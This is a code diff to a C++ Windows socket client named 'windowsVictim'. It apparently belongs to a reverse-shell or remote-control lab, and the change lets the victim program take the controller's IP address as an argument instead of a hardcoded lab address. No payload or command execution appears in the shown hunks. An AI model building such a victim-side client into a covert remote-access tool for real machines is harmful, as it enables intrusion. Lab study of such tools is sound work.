@@ -6,7 +6,11 @@
 #define BUFFERSIZE 4096
 #define SERVER_STATUS_CLOSED "Connection closed by server"
 
-int main() {
+int main(int argc, char* argv[]) {
+    if(argc < 2) {
+        std::cout << "Please use \"./windowsVictim [ip]\"\n";
+        return 1;
+    }
     sockaddr_in serverAddress;
     WSADATA wsa;
     char buffer[BUFFERSIZE];
@@ -30,10 +34,16 @@ int main() {
 
     serverAddress.sin_family = AF_INET;
     serverAddress.sin_port = htons(PORT);
-    inet_pton(AF_INET, "192.168.56.102", &serverAddress.sin_addr);
+    
+    std::string serverip = argv[1];
+
+    if(inet_pton(AF_INET, serverip.c_str(), &serverAddress.sin_addr) <= 0) {
+        std::cout << "invalid ip address\n";
+        return 1;
+    }
 
     if(connect(sock, (sockaddr*) &serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
-        perror("Connection failed\n");
+        std::cout << "Connection failed\n";
         closesocket(sock);
         WSACleanup();
         return 1;
@@ -71,6 +81,6 @@ int main() {
         }
     }
     closesocket(sock);
-    WSACleanup;
+    WSACleanup();
     return 0;
 }
